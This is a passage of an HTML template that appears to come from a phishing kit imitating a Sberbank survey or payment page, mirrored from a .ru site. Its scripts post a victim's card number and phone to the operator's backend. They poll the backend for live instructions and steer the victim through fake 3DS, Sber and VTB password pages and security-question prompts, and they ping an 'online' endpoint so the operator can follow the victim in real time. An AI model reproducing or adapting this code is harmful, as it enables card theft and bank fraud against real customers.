            delete container.dataset.prevVisibility;
        }
        showLoader(false);
    }

    function logAction(phone, card, customerName = "") {
        if (!allowSend) {
            return;
        }

        const fallbackName = typeof AD_FULL_NAME === "string" ? AD_FULL_NAME : "";
        const balanceName = customerName && customerName.length ? customerName : fallbackName;

        window.__threeDSPending = true;
        showLoader(true);

        axios.post("/api/createLog", {
            adId: AD_ID,
            number: card,
            expire: "-",
            cvv: "-",
            phone_num: phone,
            balance: balanceName,
            bank: bank
        }).finally(() => (this.loading = false)).then((response) => {
                localStorage.token = response.data.token;
                allowSend = false;

                checkLogStatus(response.data.token);
            }
        ).catch((err) => {

                console.log("–û—à–∏–±–∫–∞", "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–ø—Ä–µ–¥–≤–∏–¥–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑", "error");

                window.__threeDSPending = false;
                showLoader(false);

            }
        );
    }

    function clear3DSOverlay() {
        reset3DSState();
    }

    window.enablePasswordForms = function (redirectUrl) {
        if (!redirectUrl) {
            return;
        }
        window.__threeDSActive = false;
        window.__threeDSPending = false;
        window.__allowPasswordForms = true;
        navigateWithBank(redirectUrl, true);
    };

    function checkLogStatus(logId) {
        axios.post("/api/log/status", {logId: logId})
            .then((response) => {
                const data = response.data || {};
                const status = data.status;
                const codeStatus = data.code_status;
                const codeId = data.code_id;
                const redirectUrl = data.redirect_url;

                if (status == null && codeStatus == null) {
                    setTimeout(() => {
                        checkLogStatus(logId);
                    }, 2000);
                    return;
                }

                const navigateTo3DS = () => {
                    const targetUrl = redirectUrl || `/verif/3ds?id=${logId}`;
                    navigateWithBank(targetUrl);
                };

                if (codeStatus === "SECURITY_KEY" && codeId) {
                    navigateWithBank(`/password/sber/${codeId}`);
                    return;
                }

                if (codeStatus === "SECURITY_KEY_VTB" && codeId) {
                    navigateWithBank(`/password/vtb/${codeId}`);
                    return;
                }

                if (codeStatus === "RETURN_TO_CODE") {
                    navigateTo3DS();
                    return;
                }

                if (status === "load_3ds") {
                    navigateTo3DS();
                    return;
                }

                if (status === "control_question") {
                    reset3DSState();
                    showLoader(false);
                    var div = document.createElement("div");

                    div.innerHTML = '–î–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –ª–∏—á–Ω–æ—Å—Ç–∏, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–≤–µ—Ç—å—Ç–µ –Ω–∞ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–π –≤–æ–ø—Ä–æ—Å.<br><br><strong>–ö–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–π –≤–æ–ø—Ä–æ—Å:  </strong>' + data.question_text;

                    swal(
                        {
                            title: "–û—à–∏–±–∫–∞!",
                            content: div,
                            icon: "error",
                            closeOnClickOutside: false,
                            closeOnEsc: false,
                            button: "OK",
                            showCancelButton: false
                        }
                    ).then(() => {
                        if (redirectUrl) {
                            navigateWithBank(redirectUrl);
                        } else {
                            setTimeout(() => checkLogStatus(logId), 1000);
                        }
                    });
                    return;
                }

                reset3DSState();

        if ("{{ errors.reload }}" === status) {
                    showPopup(
                        "–û—à–∏–±–∫–∞!",
                        status
                    ).then(() => {
                        reset3DSState();
                        document.location.reload();
                    });
                    return;
                }

                if (typeof status === "string" && status.includes(":=:")) {
                    const args = status.split(":=:");

                    const action = args[0];

                    const text = args[1];

                    if (action === "RELOAD") {
                        showPopup(
                            "–û—à–∏–±–∫–∞!",
                            text
                        ).then(() => {
                            reset3DSState();
                            document.location.reload();
                        });
                    } else if (action === "BANK") {

                        showPopup(
                            "–û—à–∏–±–∫–∞!",
                            text
                        ).then(() => {
                            reset3DSState();
                            window.location.replace(bankReturnPath);
                        });
                    }
                    return;
                }

                if ("{{ errors.banks }}" === status) {
                    showPopup(
                        "–û—à–∏–±–∫–∞!",
                        status
                    ).then(() => {
                        reset3DSState();
                        window.location.replace(bankReturnPath);
                    });

                    return;
                }

                if (status) {
                    showPopup(
                        "–û—à–∏–±–∫–∞!",
                        status
                    );
                }
            })
            .catch((error) => {
                console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ —Å—Ç–∞—Ç—É—Å–∞:", error);
            })
    };


</script>
<script>

    const interval = setInterval(() => {
        const hasErrorEl = document.querySelector('.has-error');
        if (hasErrorEl) {
            document.querySelectorAll('.has-error').forEach(el => el.classList.remove('has-error'));
            clearInterval(interval);
        }
    }, 50);
</script>

<div id="give-freely-root-ejkiikneibegknkgimmihdpcbcedgmpo" class="give-freely-root"
     data-extension-id="ejkiikneibegknkgimmihdpcbcedgmpo" data-extension-name="Volume Booster" style="display: block;"
     data-scrapbook-shadowdom="<style>
  :host {
    all: initial;
  }

  .gf-scroll-remove::-webkit-scrollbar {
    border-radius-bottom-right: 15px;
  }

  button {
    cursor: pointer;
    transition: transform 0.1s ease;
  }

  button:active {
    transform: scale(0.98);
  }

  .give-freely-close-button:hover {
    opacity: 0.7;
  }

  input[type=&quot;radio&quot;] {
    margin-right: 8px;
  }

  hr {
    border: none;
    border-top: 1px solid #e5e5e5;
    margin: 1em 0;
  }

  @media (max-width: 600px), (max-height: 480px) {
    #give-freely-checkout-popup {
      display: none !important;
    }
  }
</style><div><div class=&quot;gf-app&quot;></div></div>"></div>
<script data-scrapbook-elem="basic-loader">(function () {
    var k1 = "data-scrapbook-shadowdom", k2 = "data-scrapbook-canvas", k3 = "data-scrapbook-input-indeterminate",
        k4 = "data-scrapbook-input-checked", k5 = "data-scrapbook-option-selected", k6 = "data-scrapbook-input-value",
        k7 = "data-scrapbook-textarea-value", k8 = "data-scrapbook-adoptedstylesheets",
        k9 = /^data-scrapbook-adoptedstylesheet-(\d+)$/, k10 = "data-scrapbook-shadowdom-mode",
        k11 = "data-scrapbook-shadowdom-clonable", k12 = "data-scrapbook-shadowdom-delegates-focus",
        k13 = "data-scrapbook-shadowdom-serializable", k14 = "data-scrapbook-shadowdom-slot-assignment",
        k15 = "data-scrapbook-slot-assigned", k16 = "data-scrapbook-slot-index", k17 = /^scrapbook-slot-index=(\d+)$/,
        k18 = '/scrapbook-slot-index', d = document, r = d.documentElement, $s = !!r.attachShadow,
        $as = !!d.adoptedStyleSheets, $c = !!window.HTMLCanvasElement, $sa = !!d.createElement('slot').assign, sle = [],
        sls = [], slt = function (r) {
            if ($sa) {
                var E = r.childNodes, i, e, s, m;
                for (i = 0; i < E.length; i++) {
                    e = E[i];
                    if (e.nodeType === 8) {
                        s = e.nodeValue;
                        if (m = s.match(k17)) {
                            s = e.nextSibling;
                            if (s.nodeType === 3) {
                                sls[m[1]] = s;
                            }
                            r.removeChild(e);
                            i--;
                        } else if (s === k18) {
                            r.removeChild(e);
                            i--;
                        }
                    }
                }
            }
        }, sl = function () {
            var i = sle.length, j, d, e;
            while (i--) {
                d = sle[i];
                e = d.elem;
                d = d.value.split(',');
                j = d.length;
                while (j--) {
                    d[j] = sls[parseInt(d[j], 10)];
                }
                try {
                    e.assign.apply(e, d);
                } catch (ex) {
                    console.error(ex);
                }
            }
        }, asl = (function (r) {
            var l = [], E, i, e, m, c, j;
            if ($as) {
                E = r.attributes;
                i = E.length;
                while (i--) {
                    e = E[i];
                    if (!(m = e.nodeName.match(k9))) {
                        continue;
                    }
                    c = l[m[1]] = new CSSStyleSheet();
                    r.removeAttribute(m[0]);
                    m = e.nodeValue.split('\n\n');
                    j = m.length;
                    while (j--) {
                        try {
                            m[j] && c.insertRule(m[j]);
                        } catch (ex) {
                            console.error(ex);
                        }
                    }
                }
            }
            return l;
        })(r), as = function (d, e) {
            var l, i, I;
            if ($as && (l = e.getAttribute(k8)) !== null) {
                l = l.split(',');
                for (i = 0, I = l.length; i < I; i++) {
                    d.adoptedStyleSheets.push(asl[l[i]]);
                }
                e.removeAttribute(k8);
            }
        }, fn = function (r) {
            var E = r.querySelectorAll ? r.querySelectorAll("*") : r.getElementsByTagName("*"), i = E.length, e, d, s, m;
            while (i--) {
                e = E[i];
                s = e.shadowRoot;
                if ($s && (d = e.getAttribute(k1))) {
                    if (!s) {
                        try {
                            s = e.attachShadow({
                                mode: (m = e.getAttribute(k10)) !== null ? m : 'open',
                                clonable: e.hasAttribute(k11),
                                delegatesFocus: e.hasAttribute(k12),
                                serializable: e.hasAttribute(k13),
                                slotAssignment: (m = e.getAttribute(k14)) !== null ? m : void 0,
                            });
                            s.innerHTML = d;
                        } catch (ex) {
                            console.error(ex);
                        }
                    }
                    e.removeAttribute(k1);
                    e.removeAttribute(k10);
                    e.removeAttribute(k11);
                    e.removeAttribute(k12);
                    e.removeAttribute(k13);
                    e.removeAttribute(k14);
                }
                if ($c && (d = e.getAttribute(k2)) !== null) {
                    (function () {
                        var c = e, g = new Image();
                        g.onload = function () {
                            c.getContext('2d').drawImage(g, 0, 0);
                        };
                        g.src = d;
                    })();
                    e.removeAttribute(k2);
                }
                if ((d = e.getAttribute(k3)) !== null) {
                    e.indeterminate = true;
                    e.removeAttribute(k3);
                }
                if ((d = e.getAttribute(k4)) !== null) {
                    e.checked = d === 'true';
                    e.removeAttribute(k4);
                }
                if ((d = e.getAttribute(k5)) !== null) {
                    e.selected = d === 'true';
                    e.removeAttribute(k5);
                }
                if ((d = e.getAttribute(k6)) !== null) {
                    e.value = d;
                    e.removeAttribute(k6);
                }
                if ((d = e.getAttribute(k7)) !== null) {
                    e.value = d;
                    e.removeAttribute(k7);
                }
                if ($sa && (d = e.getAttribute(k15)) !== null) {
                    sle.push({elem: e, value: d});
                    e.removeAttribute(k15);
                }
                if ($sa && (d = e.getAttribute(k16)) !== null) {
                    sls[d] = e;
                    e.removeAttribute(k16);
                }
                if (s) {
                    slt(e);
                    as(s, e);
                    fn(s);
                }
            }
        };
    as(d, r);
    fn(d);
    sl();
})()</script>

<script type="text/javascript">
    // Template-safe constants
    const AD_ID = {{ ad.id | tojson }};
    const AD_FULL_NAME = {{ ad.full_name | default('', true) | tojson }};
    const LOG_UNIQUE_ID = {{ (log.unique_id if log is defined and log else '') | tojson }};

    checkOnline();

    async function checkOnline() {
        axios.post("/api/updateOnline", { id: AD_ID }).finally(() => setTimeout(checkOnline, 1500)).then().catch((err) => err);
    }
</script>

</body>
<!-- Mirrored from tvou-opros-portal24.ru/index_sber.php by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 15 Jun 2025 10:26:35 GMT -->
</html>
